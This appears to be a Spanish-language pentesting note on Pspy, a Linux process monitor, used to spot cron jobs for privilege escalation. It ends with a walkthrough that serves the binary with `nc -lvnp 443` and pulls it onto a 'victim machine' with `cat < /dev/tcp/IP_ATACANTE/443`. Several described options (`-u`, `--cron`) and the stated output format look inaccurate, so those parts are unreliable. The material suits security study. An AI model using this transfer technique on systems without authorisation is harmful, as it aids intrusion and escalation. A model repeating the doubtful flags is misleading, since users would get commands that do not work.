
---
# Herramienta: Pspy

Este documento resume cómo instalar y usar Pspy para monitorizar procesos y tareas cron en sistemas Linux, ayudándonos a detectar posibles vectores de ataque para la escalada de privilegios.

## Introducción

> Pspy es una herramienta de código abierto diseñada para monitorear en tiempo real la ejecución de procesos y tareas en sistemas Unix/Linux, sin necesidad de permisos root. Es especialmente útil para detectar tareas programadas (cron jobs), comandos ejecutados y otros procesos que pueden pasar desapercibidos, lo que la hace muy valiosa para auditorías de seguridad y pruebas de escalada de privilegios.

---

## Objetivo

Aprender a usar Pspy para detectar tareas cron y procesos que se ejecutan en segundo plano, y entender cómo interpretar su salida para identificar posibles vectores de ataque.

---

## Instalación y despliegue

Acción:

```bash
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
chmod +x pspy64
./pspy64
````

Explicación: Descargamos la versión más reciente de Pspy para sistemas Linux de 64 bits, le damos permisos de ejecución y la lanzamos para comenzar a monitorizar.

---

## Uso básico y comandos principales

### Ejecución sin argumentos

Acción:

```bash
./pspy64
```

Explicación: Pspy comienza a mostrar en tiempo real todos los procesos y comandos que se ejecutan en el sistema, incluyendo aquellos iniciados por tareas cron y otros servicios.

---

### Filtrar procesos por usuario

Acción:

```bash
./pspy64 -u <usuario>
```

Ejemplo:

```bash
./pspy64 -u root
```

Explicación: Solo muestra procesos ejecutados por el usuario especificado, útil para enfocarse en tareas de un usuario en particular.

---

### Mostrar solo tareas cron y comandos relacionados

Acción:

```bash
./pspy64 --cron
```

Explicación: Filtra la salida para mostrar únicamente eventos relacionados con la ejecución de tareas cron, facilitando la identificación de cron jobs activos.

---

### Guardar la salida en un archivo

Acción:

```bash
./pspy64 > pspy_output.log
```

Explicación: Redirige la salida a un archivo para su posterior análisis.

---

## Interpretación de la salida

Pspy muestra líneas con la siguiente estructura general:

```
[HH:MM:SS] UID PID CMD
```

- `HH:MM:SS`: hora en la que se detecta el proceso o comando.
    
- `UID`: ID del usuario que ejecuta el proceso.
    
- `PID`: ID del proceso.
    
- `CMD`: comando o script ejecutado.
    

Por ejemplo, una línea puede indicar que una tarea cron ejecutó un script vulnerable, lo cual puede ser una oportunidad para escalar privilegios.

---

## Ventajas de Pspy

- No requiere permisos root para monitorizar procesos.
    
- Detecta tareas cron y otros procesos en tiempo real.
    
- Útil para auditorías de seguridad y detección de vectores de escalada de privilegios.
    

---

## Buenas prácticas

- Ejecutar Pspy con los permisos adecuados para obtener la información necesaria.
    
- Revisar la salida cuidadosamente para identificar scripts o comandos sospechosos.
    
- Usar la opción de filtrado para facilitar el análisis según el usuario o tipo de proceso.
    
- Combinar con otras herramientas para fortalecer la auditoría de seguridad.
    

---

## Referencias

- [Repositorio oficial de Pspy en Github](https://github.com/DominicBreuker/pspy)
    

---

# Transferencia de pspy64 para análisis de tareas cron

Durante nuestro proceso de elevación de privilegios, nos encontramos en una situación en la que necesitamos analizar las tareas programadas (`cron`) que se ejecutan con privilegios más altos que los nuestros. Para ello, vamos a utilizar la herramienta `pspy64`, que nos permite monitorear procesos sin necesidad de privilegios elevados ni de ser instalada en el sistema víctima.

## Contexto

Nos encontramos en una máquina víctima a la que ya hemos accedido con un usuario limitado. Nuestro objetivo es observar qué tareas cron se ejecutan para identificar posibles vectores de escalada de privilegios.

Como `pspy64` no está disponible en la máquina víctima, necesitamos transferirla desde nuestra máquina atacante.

## Paso 1: Preparar la máquina atacante

Primero, nos situamos en el directorio donde tenemos `pspy64` en nuestra máquina atacante. Verificamos su presencia:

```bash
ls pspy64
pspy64
````

Luego, utilizamos `netcat` (`nc`) para escuchar en el puerto 443 y enviar el binario cuando la víctima se conecte:

```bash
nc -lvnp 443 < pspy64
```

Con esto, dejamos a `netcat` a la espera de una conexión entrante. En cuanto la máquina víctima se conecte, el binario `pspy64` se transferirá automáticamente.

## Paso 2: Descargar `pspy64` en la máquina víctima

Desde la máquina víctima, utilizamos redirección de entrada/salida con `/dev/tcp` para establecer una conexión TCP con la máquina atacante en el puerto 443 y guardar el contenido en un archivo llamado `pspy64`:

```bash
cat < /dev/tcp/IP_ATACANTE/443 > pspy64
```

**Nota**: Reemplazamos `IP_ATACANTE` por la dirección IP real de nuestra máquina atacante.

Para comprobar que se transfirió correctamente ejecutamos una comprobación de su hash

```bash
md5sum pspy64
88b43b16187976296c543526e1cb606f  pspy64  # comparamos este código con el de la máquina víctima si son iguales esta bien
```
## Paso 3: Dar permisos de ejecución

Una vez recibido el archivo, le damos permisos de ejecución en la máquina víctima:

```bash
chmod +x pspy64
```

## Paso 4: Ejecutar `pspy64`

Ahora podemos ejecutar `pspy64` para observar los procesos en tiempo real, incluyendo la ejecución de tareas cron:

```bash
./pspy64
```

Esto nos permitirá detectar posibles tareas cron que ejecuten scripts o binarios con permisos elevados, lo cual puede convertirse en un punto de entrada para escalar privilegios.

## Conclusión

La técnica mostrada nos permite transferir herramientas de análisis sin necesidad de servicios adicionales como `scp` o `wget`, lo que resulta útil en entornos restringidos. `pspy64` es una herramienta fundamental en auditorías de sistemas donde necesitamos observar la actividad del sistema sin ser detectados o sin contar con privilegios de administrador.

Continuamos ahora con el análisis de las tareas programadas para identificar vectores de escalada de privilegios.

---

